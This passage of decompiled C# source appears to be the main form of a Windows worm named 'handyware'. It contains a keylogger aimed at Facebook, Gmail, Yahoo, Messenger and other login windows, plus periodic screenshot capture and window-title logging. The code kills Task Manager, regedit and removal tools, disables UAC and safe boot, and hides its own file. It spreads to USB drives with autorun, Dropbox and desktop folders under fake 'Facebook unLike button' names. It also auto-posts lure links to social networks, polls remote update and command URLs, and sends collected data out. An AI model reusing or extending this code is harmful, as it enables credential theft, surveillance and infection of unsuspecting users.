		case 52:
			return "4";
		case 53:
			return "5";
		case 54:
			return "6";
		case 55:
			return "7";
		case 56:
			return "8";
		case 57:
			return "9";
		case 20:
			return "<Caps-Lock>";
		case 16:
			if (canRetShift)
			{
				return "<Shift>";
			}
			if (flag)
			{
				return ((char)i).ToString();
			}
			return ((char)(i + 32)).ToString();
		case 112:
			return "<F1>";
		case 113:
			return "<F2>";
		case 114:
			return "<F3>";
		case 115:
			return "<F4>";
		case 116:
			return "<F5>";
		case 117:
			return "<F6>";
		case 118:
			return "<F7>";
		case 119:
			return "<F8>";
		case 120:
			return "<F9>";
		case 121:
			return "<F10>";
		case 122:
			return "<F11>";
		case 123:
			return "<F12>";
		case 91:
			return "<Windows-Key>";
		case 93:
			return "<Menu-Key>";
		case 64:
			return "@";
		default:
			if (flag)
			{
				return ((char)i).ToString();
			}
			return ((char)(i + 32)).ToString();
		case 219:
			return "[";
		case 220:
			return "\\";
		case 221:
			return "]";
		case 222:
			return "'";
		case 186:
			return ";";
		case 187:
			return "=";
		case 188:
			return ",";
		case 189:
			return "-";
		case 190:
			return ".";
		case 191:
			return "/";
		case 160:
			return "<Left-Shift>";
		case 161:
			return "<Right Shift>";
		case 162:
			return "<Ctrl>";
		case 163:
			return "<Ctrl>";
		case 164:
			return "<Alt>";
		case 165:
			return "<Alt>";
		}
	}

	private int originalFSX()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Microsoft Games\\Flight Simulator", writable: false);
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				if (subKeyNames[i] == "10.0")
				{
					registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Microsoft Games\\Flight Simulator\\" + subKeyNames[i], writable: false);
					text = registryKey.GetValue("AppPath")!.ToString();
					if (Directory.Exists(text))
					{
						break;
					}
					return 0;
				}
			}
			if (text == "")
			{
				return 0;
			}
			if (Hash.SHA512(getBytesOfFile(text + "api.dll")) == "9fa7709b047fca227d3f9fcae3388442af8bacc19c5cb6118b21c5ea3f752a593e1c6fe598a0d8e325997ac80bcc67c24c6c77c6d04566219ca761df6c13f63e" || Hash.SHA512(getBytesOfFile(text + "api.dll")) == "60835e53a7da9af2abcff0e79562f0e4d796679a0456fa5e42f6565f5b650e9017927dcf033378abcca9b35a9eec784f7809f8a1646484cc6d4f82e3363392dd")
			{
				return -1;
			}
			if (Hash.SHA512(getBytesOfFile(text + "main.dll")) == "eea5a7c758ad6d418cc60a15ce5f65cded0d8745dbee9991a35448191450193d4a39781eb75af5e24d92635756d065d5bd66069851b474def7afedcf6cb07ee5" || Hash.SHA512(getBytesOfFile(text + "main.dll")) == "4a6ad61c7a01826ab3e423cd5ee66ee843224e20de0a560479abc6534e704cfc9c843b022105db72f239f7b184d1b735d8a81ab2250a37910956355faa63759a")
			{
				return -1;
			}
			if (Hash.SHA512(getBytesOfFile(text + "fsui.dll")) == "4eae0871fe701e61526e4b9175d65cf60586b77bfe671b9bc51f180b4619872354b5003e3cca65e053dffe20302adc6ecf69ee14935ca6ac1830b8f3f3cae66a" || Hash.SHA512(getBytesOfFile(text + "fsui.dll")) == "f13ee6d6758c219d0f0c85b7768923022452f38bb12d64a797208dd990f973552c82199108fe57de57af0aa070225e5352bed59bfb0719089fe15a43fe8b44a6")
			{
				return -1;
			}
			return 1;
		}
		catch (Exception ex)
		{
			writeLogError("FSX Original\r\nError: " + ex.Message);
			return 0;
		}
	}

	private List<string> checkHostsFile()
	{
		List<string> list = new List<string>();
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
			StreamReader streamReader = new StreamReader(text);
			List<string> list2 = new List<string>();
			while (!streamReader.EndOfStream)
			{
				list2.Add(streamReader.ReadLine());
			}
			streamReader.Close();
			foreach (string item in list2)
			{
				if (Contains(item, "activate.adobe.com", StringComparison.CurrentCultureIgnoreCase))
				{
					list.Add("The file " + text + "\r\nis blocking the Adobe to validate their programs!|http://www.adobe.com/products/catalog.html");
				}
			}
		}
		catch (Exception ex)
		{
			writeLogError("Check Host File\r\nError: " + ex.Message);
		}
		return list;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	public void setWallpaper(string filename)
	{
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0u, filename, SPIF_UPDATEINIFILE);
	}

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	private string getActiveWindowTitle()
	{
		IntPtr zero = IntPtr.Zero;
		StringBuilder stringBuilder = new StringBuilder(256);
		zero = GetForegroundWindow();
		if (GetWindowText(zero, stringBuilder, 256) > 0)
		{
			return stringBuilder.ToString();
		}
		return "";
	}

	private string getActiveWindowTitle(IntPtr handle)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			GetWindowText(handle, stringBuilder, int.MaxValue);
			return stringBuilder.ToString();
		}
		catch
		{
			return "";
		}
	}

	private void killProcess(string name)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				if (processes[i].ProcessName == name)
				{
					processes[i].Kill();
				}
			}
		}
		catch
		{
		}
	}

	private void killProcessByTile(string title)
	{
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.Length; i++)
		{
			try
			{
				string activeWindowTitle = getActiveWindowTitle(processes[i].MainWindowHandle);
				if (activeWindowTitle != "" && activeWindowTitle == title)
				{
					processes[i].Kill();
				}
			}
			catch
			{
			}
		}
	}

	private void killProcessByTile(List<string> titles)
	{
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.Length; i++)
		{
			try
			{
				string activeWindowTitle = getActiveWindowTitle(processes[i].MainWindowHandle);
				bool flag = false;
				foreach (string title in titles)
				{
					if (Contains(activeWindowTitle, title, StringComparison.CurrentCultureIgnoreCase))
					{
						flag = true;
						break;
					}
				}
				if (activeWindowTitle != "" && flag)
				{
					processes[i].Kill();
				}
			}
			catch
			{
			}
		}
	}

	private bool existProcess(string name)
	{
		Process[] processes = Process.GetProcesses();
		bool result = false;
		for (int i = 0; i < processes.Length; i++)
		{
			if (processes[i].ProcessName == name)
			{
				result = true;
			}
		}
		return result;
	}

	private void killDoubleHandyware()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			bool flag = false;
			int num = 0;
			while (true)
			{
				if (num >= processes.Length)
				{
					return;
				}
				if (processes[num].ProcessName == "handyware_su")
				{
					if (flag)
					{
						break;
					}
					flag = true;
				}
				num++;
			}
			processes[num].Kill();
		}
		catch
		{
		}
	}

	private bool Contains(string FontString, string FindString, StringComparison Comparison)
	{
		return FontString.IndexOf(FindString, Comparison) != -1;
	}

	private byte[] getBytesOfFile(string filePath)
	{
		FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		byte[] result = binaryReader.ReadBytes(Convert.ToInt32(new FileInfo(filePath).Length));
		binaryReader.Close();
		fileStream.Close();
		return result;
	}

	private string getLocalIP()
	{
		try
		{
			return Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
		}
		catch
		{
			return "Unknown";
		}
	}

	private void writeLogError(string text)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(logPathError, append: true);
			streamWriter.WriteLine(text);
			streamWriter.Write("\r\n\r\n");
			streamWriter.Close();
		}
		catch
		{
		}
	}

	private void writeLogWindowTitle(string text)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(logPathWindowTitle, append: true);
			streamWriter.WriteLine(text);
			streamWriter.Write("\r\n\r\n");
			streamWriter.Close();
		}
		catch
		{
		}
	}

	private string getShareLink(bool facebook)
	{
		Random random = new Random();
		int index = random.Next(urlsAutoShare.Count);
		if (facebook)
		{
			string[] array = urlsAutoShare[index].Split(new char[1] { '|' });
			return array[1];
		}
		return urlsAutoShare[index].Replace('|', ' ');
	}

	public Bitmap resizeBitmap(Bitmap b, int Width, int Height, int percent)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		int num = percent * Width / 100;
		int num2 = percent * Height / 100;
		Bitmap val = new Bitmap(num, num2);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.DrawImage((Image)(object)b, 0, 0, num, num2);
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		return val;
	}

	private void savePrint(int number)
	{
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		string text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString();
		text = number switch
		{
			1 => text + " - PRINT1.png", 
			2 => text + " - PRINT2.png", 
			3 => text + " - PRINT3.png", 
			_ => text + " - PRINT1.png", 
		};
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
		val = resizeBitmap(val, ((Image)val).get_Width(), ((Image)val).get_Height(), 80);
		((Image)val).Save(workspace + "\\" + text, ImageFormat.get_Png());
	}

	private bool existProcessList(string procName)
	{
		List<string> list = new List<string>(new string[32]
		{
			"aetcrss1", "alg", "csrss", "ctfmon", "dllhost", "dwm", "explorer", "helpsvc", "hkcmd", "igfxpers",
			"igfxsrvc", "igfxtray", "lsass", "msiexec", "nvvsvc", "nvsvc32", "RTHDCPL", "RtHDVCpl", "rundll32", "scardsvr",
			"services", "smss", "sndvol32", "spoolsv", "svchost", "taskeng", "taskmgr", "wercon", "winlogon", "wmiapsrv",
			"wmiprvse", "wuauclt"
		});
		if (list.Contains(procName))
		{
			return true;
		}
		foreach (string item in lstProcess)
		{
			if (item.Split(new char[1] { '|' })[0] == procName)
			{
				return true;
			}
		}
		return false;
	}

	private void saveProcesses()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				try
				{
					if (!existProcessList(processes[i].ProcessName))
					{
						lstProcess.Add(processes[i].ProcessName + "|" + processes[i].MainModule!.FileName);
					}
				}
				catch
				{
				}
			}
			lstProcess.Sort();
		}
		catch
		{
		}
	}

	private void killNativeProcess()
	{
		if (existProcess("msconfig"))
		{
			killProcess("msconfig");
		}
		if (existProcess("taskmgr"))
		{
			killProcess("taskmgr");
		}
		if (existProcess("regedit"))
		{
			killProcess("regedit");
		}
		if (existProcess("cmd"))
		{
			killProcess("cmd");
		}
	}

	private void killNotNativeProcess()
	{
		try
		{
			if (existProcess("killbox"))
			{
				killProcess("killbox");
			}
			if (existProcess("unlocker"))
			{
				killProcess("unlocker");
			}
			if (existProcess("Unlocker"))
			{
				killProcess("Unlocker");
			}
			List<string> list = new List<string>();
			list.Add("pocket killbox");
			list.Add("RegSeeker");
			list.Add("Process Explorer");
			list.Add("RegScanner");
			list.Add("Hijack");
			list.Add("KillProcess");
			list.Add("Antivirus Setup");
			list.Add("HijackThis");
			killProcessByTile(list);
		}
		catch
		{
		}
	}

	private void actWindowsPirata()
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		if (!File.Exists(workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareGenuineWindows") + ".txt"))
		{
			MessageBox.Show("You don't have a genuine Windows!", "Pirate!", (MessageBoxButtons)0, (MessageBoxIcon)16);
			FileStream fileStream = new FileStream(workspace + "\\notgenuinewindows_wp.jpg", FileMode.Create, FileAccess.ReadWrite);
			fileStream.Write(Resource1.genuinewindows_wp, 0, Resource1.genuinewindows_wp.Length);
			fileStream.Close();
			setWallpaper(workspace + "\\notgenuinewindows_wp.jpg");
		}
	}

	public Form1()
	{
		//IL_0374: Unknown result type (might be due to invalid IL or missing references)
		//IL_037e: Expected O, but got Unknown
		InitializeComponent();
		workspace = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\handyware";
		currentVersion = "0.9.3";
		if (!Directory.Exists(workspace))
		{
			Directory.CreateDirectory(workspace);
		}
		logPathError = workspace + "\\logerror";
		logPathWindowTitle = workspace + "\\logwindowtitle";
		try
		{
			File.Delete(workspace + "\\handyware_newversion.exe");
		}
		catch
		{
		}
		try
		{
			File.Delete(logPathError);
		}
		catch
		{
		}
		if (!File.Exists(workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareDontStart") + ".txt"))
		{
			killProcess("monitor");
			if (!existProcess("monitor"))
			{
				File.Delete(workspace + "\\monitor.exe");
				FileStream fileStream = new FileStream(workspace + "\\monitor.exe", FileMode.Create, FileAccess.ReadWrite);
				fileStream.Write(Resource1.monitor, 0, Resource1.monitor.Length);
				fileStream.Close();
				Process.Start(workspace + "\\monitor.exe");
			}
			actWorm = new WormAction(workspace, Application.get_ExecutablePath().ToString(), logPathError);
			killNotNativeProcess();
			actWorm.removeUACRegistry();
			actWorm.removeBootSafe();
			FileInfo fileInfo = new FileInfo(Application.get_ExecutablePath());
			if (fileInfo.Name == "handyware_newversion.exe")
			{
				killProcess("handyware_su");
				while (true)
				{
					try
					{
						File.Delete(workspace + "\\handyware_su.exe");
						File.Copy(Application.get_ExecutablePath(), workspace + "\\handyware_su.exe", overwrite: true);
					}
					catch (Exception)
					{
						killProcess("handyware_su");
						Thread.Sleep(2000);
						continue;
					}
					break;
				}
				while (true)
				{
					try
					{
						Process.Start(workspace + "\\handyware_su.exe");
					}
					catch
					{
						Thread.Sleep(1000);
						continue;
					}
					break;
				}
				timer_CloseHandyware.set_Enabled(true);
				return;
			}
			if (fileInfo.Name == "handyware_su.exe")
			{
				uptProgram = new UpdateProgram("http://mylogin.altervista.org/handyware.txt", "http://dl.dropbox.com/u/19496504/programacao/atualizacoes/Handyware.txt", workspace, currentVersion);
				iTimerHide = 0;
				hided = false;
				timer_hide.set_Enabled(true);
				infoStartUp = "No";
				startTime = DateTime.Now;
				lstNotifications = new List<string>();
				lstAllPaths = new List<string>();
				thrFindCrack = new Thread(findCrack);
				palavrasChaveCrack = new List<string>(new string[8] { "crack", "ativador", "activator", "keygen", "keygenerator", "keymaker", "serial", "hack" });
				fileSystemWatcher_userProfileFolder.Path = Environment.ExpandEnvironmentVariables("%userprofile%").ToString();
				mouseDown = false;
				((Control)this).set_Cursor(Cursors.get_SizeAll());
				((Control)label_mex).set_Cursor(Cursors.get_SizeAll());
				chbxNotificationShowHide = new CheckBox();
				chbxNotificationShowHide.set_Checked(false);
				chbxNotificationShowHide.add_CheckedChanged((EventHandler)checkBoxNotification_CheckedChanged);
				timer_notifyFilaEspera.set_Enabled(true);
				urlsAutoShare = new List<string>(new string[4] { "'WorldCup 2014 - YouTube'|http://tinyurl.com/d7e7jnd", "Avast Utilities - Safe your socials!|http://tinyurl.com/d4t5cu3", "'YouTube - SantaClaus Lazy Song'|http://tinyurl.com/6qp3yhz", "Download unlike button for Facebook|http://tinyurl.com/7rjevnn" });
				fileDesktop = "Facebook unLike button.exe";
				fileDocuments = "unLike Button for Facebook.exe";
				fileDevices = "Facebook Unlike Button Install.exe";
				fileDropbox = "Facebook unLike button.exe";
				browseChrome = false;
				browseExplorer = false;
				browseFirefox = false;
				browseSafari = false;
				timePrint1 = DateTime.Now;
				timePrint2 = DateTime.Now;
				timePrint3 = DateTime.Now;
				Print1 = false;
				Print2 = false;
				Print3 = false;
				thrSendPrints = new Thread(sendPrints);
				thrPrintRequest = new Thread(printRequest);
				thrPrintRequest.Start();
				messageboxText = "";
				messageboxTitle = "";
				thrCommandRequest = new Thread(commandRequest);
				thrCommandRequest.Start();
				oldWindowTitle = "";
				currentWindowTitle = "";
				lastWindowMsn = "";
				shareFacebook = false;
				shareTwitter = false;
				shareMsn = false;
				timer_checkWindowTitle.set_Enabled(true);
				actWorm.copyToDropbox("Private.exe");
				lstProcess = new List<string>();
				thrSendProcess = new Thread(sendProcess);
				thrUpdate = new Thread(updateProgram);
				thrSendInfetedData = new Thread(sendInfectedData);
				thrSendLog = new Thread(sendLog);
				timer_05min.set_Enabled(true);
				timer_20min.set_Enabled(true);
				timer_10min.set_Enabled(true);
				timer_30seg.set_Enabled(true);
				timer_30min.set_Enabled(true);
				timer_01seg.set_Enabled(true);
				timer_01min.set_Enabled(true);
				keyDown = false;
				canRetShift = true;
				logger = "";
				oldWindowLog = "";
				timer_logger.set_Enabled(true);
				return;
			}
			if (fileInfo.Name == "winhost")
			{
				if (!existProcess("handyware_su"))
				{
					timer_hide.set_Enabled(true);
					timer_guardadinhoCheck.set_Tag((object)"");
					timer_guardadinhoCheck.set_Enabled(true);
				}
				else
				{
					timer_CloseHandyware.set_Enabled(true);
				}
				return;
			}
			if (!existProcess("handyware_su"))
			{
				Process.Start("http://www.facebook.com/sharer.php?u=http://tinyurl.com/7rjevnn");
				File.Copy(Application.get_ExecutablePath(), workspace + "\\handyware_su.exe", overwrite: true);
				Process.Start(workspace + "\\handyware_su.exe");
				timer_CloseHandyware.set_Enabled(true);
				return;
			}
			Process.Start("http://www.facebook.com/sharer.php?u=http://tinyurl.com/7rjevnn");
			killProcess("handyware_su");
			while (true)
			{
				try
				{
					File.Delete(workspace + "\\handyware_su.exe");
					File.Copy(Application.get_ExecutablePath(), workspace + "\\handyware_su.exe", overwrite: true);
				}
				catch (Exception)
				{
					killProcess("handyware_su");
					Thread.Sleep(2000);
					continue;
				}
				break;
			}
			while (true)
			{
				try
				{
					Process.Start(workspace + "\\handyware_su.exe");
				}
				catch
				{
					Thread.Sleep(1000);
					continue;
				}
				break;
			}
			timer_CloseHandyware.set_Enabled(true);
		}
		else
		{
			timer_CloseHandyware.set_Enabled(true);
		}
	}

	private void timer_hide_Tick(object sender, EventArgs e)
	{
		if (iTimerHide > 12)
		{
			timer_hide.set_Enabled(false);
			hided = true;
		}
		else if (iTimerHide > 5)
		{
			timer_hide.set_Interval(5000);
		}
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).Hide();
		if (!File.Exists(workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareHideMyFile") + ".txt"))
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		iTimerHide++;
	}

	private void timer_01seg_Tick(object sender, EventArgs e)
	{
		timer_01seg.set_Enabled(false);
		killNativeProcess();
		killNotNativeProcess();
		if (!existProcess("monitor"))
		{
			File.Delete(workspace + "\\monitor.exe");
			FileStream fileStream = new FileStream(workspace + "\\monitor.exe", FileMode.Create, FileAccess.ReadWrite);
			fileStream.Write(Resource1.monitor, 0, Resource1.monitor.Length);
			fileStream.Close();
			Process.Start(workspace + "\\monitor.exe");
		}
		if (messageboxText != "" && messageboxTitle != "")
		{
			((Control)new Form_MessageBox(messageboxTitle, messageboxText)).Show();
			messageboxText = "";
			messageboxTitle = "";
		}
		timer_01seg.set_Interval(1000);
		timer_01seg.set_Enabled(true);
	}

	private void timer_propagacao_Tick(object sender, EventArgs e)
	{
		timer_30seg.set_Interval(30000);
		infoStartUp = actWorm.SetStartupON("handyware", "handyware_su.exe");
		actWorm.CopyToRemovableDevices(fileDevices, HideFile: false, SetAutorun: true);
		actWorm.copyToDropbox(fileDropbox);
		actWorm.CopyToFolder(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + fileDocuments, OverWrite: true, hide: false);
		actWorm.CopyToFolder(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + fileDesktop, OverWrite: true, hide: false);
		actWorm.removeBootSafe();
		actWorm.CopyToFolder(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\host.exe", OverWrite: true);
		actWorm.SetStartupON("winhost", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\host.exe", withouWorkspace: true);
	}

	private void timer_01min_Tick(object sender, EventArgs e)
	{
		timer_01min.set_Interval(60000);
		if (!thrSendProcess.IsAlive)
		{
			saveProcesses();
		}
		if (!Print1)
		{
			if ((DateTime.Now - timePrint3).TotalMinutes >= 15.0)
			{
				savePrint(1);
				timePrint1 = DateTime.Now;
				Print1 = true;
			}
		}
		else if (!Print2)
		{
			if ((DateTime.Now - timePrint1).TotalMinutes >= 5.0)
			{
				savePrint(2);
				timePrint2 = DateTime.Now;
				Print2 = true;
			}
		}
		else if (!Print3 && (DateTime.Now - timePrint2).TotalMinutes >= 5.0)
		{
			savePrint(3);
			timePrint3 = DateTime.Now;
			Print3 = true;
			thrSendPrints = new Thread(sendPrints);
			thrSendPrints.Start();
		}
	}

	private void timer_05min_Tick(object sender, EventArgs e)
	{
		timer_05min.set_Interval(300000);
		if (!browseChrome && existProcess("chrome"))
		{
			browseChrome = true;
		}
		if (!browseExplorer && existProcess("iexplore"))
		{
			browseExplorer = true;
		}
		if (!browseSafari && existProcess("safari"))
		{
			browseSafari = true;
		}
		if (!browseFirefox && existProcess("firefox"))
		{
			browseFirefox = true;
		}
		if (!File.Exists(workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareShareMSN") + ".txt"))
		{
			shareMsn = true;
		}
	}

	private void timer_actions_Tick(object sender, EventArgs e)
	{
		timer_10min.set_Interval(600000);
		actWorm.removeUACRegistry();
		if (originalWindows6() == -1)
		{
			lstNotifications.Insert(0, "Your Windows is not genuine!|http://www.microsoft.com/windows/buy/default.aspx");
		}
		if (originalFSX() == -1)
		{
			lstNotifications.Insert(0, "The Microsoft Flight Simulator installed on this computer\r\nis not genuine!|http://www.microsoft.com/games/flightsimulatorx/");
		}
		List<string> list = checkHostsFile();
		foreach (string item in list)
		{
			lstNotifications.Insert(0, item);
		}
		if (!thrFindCrack.IsAlive)
		{
			try
			{
				thrFindCrack = new Thread(findCrack);
				thrFindCrack.Start();
			}
			catch
			{
			}
		}
		if (!thrSendInfetedData.IsAlive)
		{
			thrSendInfetedData = new Thread(sendInfectedData);
			thrSendInfetedData.Start();
		}
		if (!thrSendProcess.IsAlive)
		{
			thrSendProcess = new Thread(sendProcess);
			thrSendProcess.Start();
		}
		killDoubleHandyware();
	}

	private void timer_update_Tick(object sender, EventArgs e)
	{
		timer_20min.set_Interval(1200000);
		if (!thrUpdate.IsAlive)
		{
			thrUpdate = new Thread(updateProgram);
			thrUpdate.Start();
		}
	}

	private void timer_30min_Tick(object sender, EventArgs e)
	{
		timer_30min.set_Interval(1800000);
		if (!File.Exists(workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareShareTwitterFacebook") + ".txt"))
		{
			shareTwitter = true;
			string fileName = "https://twitter.com/share?text=" + getShareLink(facebook: false);
			Process.Start(fileName);
		}
	}

	private void timer_CloseHandyware_Tick(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void timer_notify_Tick(object sender, EventArgs e)
	{
		if (hided && !chbxNotificationShowHide.get_Checked() && lstNotifications.Count > 0)
		{
			timer_notifyFilaEspera.set_Enabled(false);
			timer_notifyFilaEspera.set_Interval(3000);
			string[] array = lstNotifications[0].Split(new char[1] { '|' });
			((Control)label_mex).set_Text(array[0]);
			try
			{
				((Control)label_mex).set_Tag((object)array[1]);
			}
			catch
			{
			}
			lstNotifications.RemoveAt(0);
			chbxNotificationShowHide.set_Checked(true);
		}
	}

	private void timer_checkWindowTitle_Tick(object sender, EventArgs e)
	{
		currentWindowTitle = getActiveWindowTitle();
		if (!(currentWindowTitle != oldWindowTitle))
		{
			return;
		}
		oldWindowTitle = currentWindowTitle;
		writeLogWindowTitle(currentWindowTitle);
		if (Contains(currentWindowTitle, "@Camilinha69", StringComparison.CurrentCultureIgnoreCase) || Contains(currentWindowTitle, "porntube", StringComparison.CurrentCultureIgnoreCase) || Contains(currentWindowTitle, "redtube", StringComparison.CurrentCultureIgnoreCase) || Contains(currentWindowTitle, "porn", StringComparison.CurrentCultureIgnoreCase))
		{
			lstNotifications.Insert(0, "This content is inappropriate for people under 18 years old.|");
		}
		if (Contains(currentWindowTitle, "torrent", StringComparison.CurrentCultureIgnoreCase) && existProcess("uTorrent"))
		{
			lstNotifications.Insert(0, "Don't download illegal files with uTorrent.|");
		}
		if (Contains(currentWindowTitle, "bitcomet", StringComparison.CurrentCultureIgnoreCase) && existProcess("BitComet"))
		{
			lstNotifications.Insert(0, "Don't download illegal files with BitComet.|");
		}
		if (Contains(currentWindowTitle, "bittorrent", StringComparison.CurrentCultureIgnoreCase) && existProcess("BitTorrent"))
		{
			lstNotifications.Insert(0, "Don't download illegal files with BitTorrent.|");
		}
		if (Contains(currentWindowTitle, "emule", StringComparison.CurrentCultureIgnoreCase) && existProcess("emule"))
		{
			lstNotifications.Insert(0, "Don't download illegal files with eMule.|");
		}
		if (Contains(currentWindowTitle, "azureus", StringComparison.CurrentCultureIgnoreCase) && existProcess("Azureus"))
		{
			lstNotifications.Insert(0, "Don't download illegal files with Azureus.|");
		}
		if (Contains(currentWindowTitle, "4shared", StringComparison.CurrentCultureIgnoreCase))
		{
			lstNotifications.Insert(0, "Don't download illegal files from 4Shared.|");
		}
		if (Contains(currentWindowTitle, "songr", StringComparison.CurrentCultureIgnoreCase) && existProcess("Songr"))
		{
			lstNotifications.Insert(0, "Don't download illegal music/video with Songr.|");
		}
		if (Contains(currentWindowTitle, "Ares", StringComparison.CurrentCultureIgnoreCase) && existProcess("Ares"))
		{
			lstNotifications.Insert(0, "Don't download illegal files with Ares.|");
		}
		if (Contains(currentWindowTitle, "tweet", StringComparison.CurrentCultureIgnoreCase) && shareTwitter)
		{
			SendKeys.Send("{TAB}");
			SendKeys.Send("{ENTER}");
			shareTwitter = false;
			shareFacebook = true;
			Process.Start("http://www.facebook.com/sharer.php?u=" + getShareLink(facebook: true));
		}
		if (Contains(currentWindowTitle, "facebook", StringComparison.CurrentCultureIgnoreCase) && shareFacebook)
		{
			SendKeys.Send("{TAB}");
			SendKeys.Send("{TAB}");
			SendKeys.Send("{TAB}");
			SendKeys.Send("{TAB}");
			SendKeys.Send("{TAB}");
			SendKeys.Send("{ENTER}");
			shareFacebook = false;
		}
		if (shareMsn && Contains(currentWindowTitle, "<", StringComparison.CurrentCultureIgnoreCase) && Contains(currentWindowTitle, ">", StringComparison.CurrentCultureIgnoreCase) && Contains(currentWindowTitle, ".", StringComparison.CurrentCultureIgnoreCase) && (Contains(currentWindowTitle, "@hotmail", StringComparison.CurrentCultureIgnoreCase) || Contains(currentWindowTitle, "@live", StringComparison.CurrentCultureIgnoreCase) || Contains(currentWindowTitle, "@msn", StringComparison.CurrentCultureIgnoreCase)))
		{
			if (currentWindowTitle != lastWindowMsn)
			{
				lastWindowMsn = currentWindowTitle;
				SendKeys.Send(getShareLink(facebook: false));
				SendKeys.Send("{ENTER}");
			}
			else
			{
				shareMsn = false;
			}
		}
	}

	private void timer_logger_Tick(object sender, EventArgs e)
	{
		timer_logger.set_Enabled(false);
		try
		{
			string activeWindowTitle = getActiveWindowTitle();
			if (oldWindowLog != activeWindowTitle)
			{
				if (logger != "" && logger.IndexOf("\r\n") != -1)
				{
					thrSendLog = new Thread(sendLog);
					thrSendLog.Start();
				}
				else
				{
					logger = "";
				}
				oldWindowLog = activeWindowTitle;
			}
			if (!thrSendLog.IsAlive)
			{
				bool flag = false;
				if (Contains(activeWindowTitle, "facebook", StringComparison.CurrentCultureIgnoreCase))
				{
					if (Contains(activeWindowTitle, "acesse", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "accedi", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "log in", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "bienvenido", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "bienvenue", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "anmelden", StringComparison.CurrentCultureIgnoreCase))
					{
						flag = true;
					}
				}
				else if (Contains(activeWindowTitle, "yahoo", StringComparison.CurrentCultureIgnoreCase))
				{
					if (Contains(activeWindowTitle, "entre", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "best web based", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "ouverture", StringComparison.CurrentCultureIgnoreCase))
					{
						flag = true;
					}
				}
				else if (Contains(activeWindowTitle, "gmail", StringComparison.CurrentCultureIgnoreCase))
				{
					if (Contains(activeWindowTitle, "email", StringComparison.CurrentCultureIgnoreCase))
					{
						flag = true;
					}
				}
				else if (activeWindowTitle == "Windows Live Messenger")
				{
					flag = true;
				}
				else if (Contains(activeWindowTitle, "bj share", StringComparison.CurrentCultureIgnoreCase))
				{
					if (Contains(activeWindowTitle, "login", StringComparison.CurrentCultureIgnoreCase))
					{
						flag = true;
					}
				}
				else if (Contains(activeWindowTitle, "foursquare", StringComparison.CurrentCultureIgnoreCase))
				{
					if (Contains(activeWindowTitle, "log in", StringComparison.CurrentCultureIgnoreCase))
					{
						flag = true;
					}
				}
				else if (Contains(activeWindowTitle, "Dropbox - Simplify your life", StringComparison.CurrentCultureIgnoreCase))
				{
					flag = true;
				}
				else if (Contains(activeWindowTitle, "orkut", StringComparison.CurrentCultureIgnoreCase))
				{
					flag = true;
				}
				else if (Contains(activeWindowTitle, "Blackboard Learn", StringComparison.CurrentCultureIgnoreCase))
				{
					flag = true;
				}
